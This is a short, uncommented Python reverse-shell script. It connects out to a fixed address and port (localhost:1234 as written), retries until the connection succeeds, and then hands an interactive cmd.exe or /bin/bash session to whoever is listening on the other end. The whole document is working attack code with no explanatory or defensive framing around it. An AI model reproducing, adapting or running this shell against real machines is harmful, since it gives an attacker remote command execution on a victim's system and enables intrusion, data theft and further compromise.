
import socket,subprocess,os,threading,sys,time

def windows(sock):
    QUIT = 0
    def host2remote(s, p,QUIT):
        while not QUIT:
            try:
                p.stdin.write(s.recv(1024).decode()); 
                p.stdin.flush()
            except:
                p.stdin.write('\n')
                p.stdin.flush()
                QUIT = 1

    def remote2host(s, p,QUIT):
        while not QUIT:
            try:
                s.send(p.stdout.read(1).encode())
            except:
                p.stdout.close();
                QUIT = 1

    remote=subprocess.Popen(["cmd","/K","cd ../../../"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()
    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()
    

    try:
        remote.wait()

    except Exception as e:
        sock.close()
        sys.exit(0)

def linux(sock):
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    remote=subprocess.call(["/bin/bash","-i"])


def getRemoteAccess():
    IP = socket.gethostbyname(socket.gethostname())
    PORT = 1234
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    QUIT = 0
    IP = "127.0.0.1"
    print (IP)
    while True:
        try:
            sock.connect((IP,1234));
            break
        except:
            try:
                time.sleep(3)
            except KeyboardInterrupt:
                sock.close()
                sys.exit(0)

    try:
        if sys.platform == "win32":
            windows(sock)
        else:
            linux(sock)
    except KeyboardInterrupt:
        sock.close()
        sys.exit(0)
    except Exception as e:
        print(e)
        sock.close()
        sys.exit(0)   

getRemoteAccess()
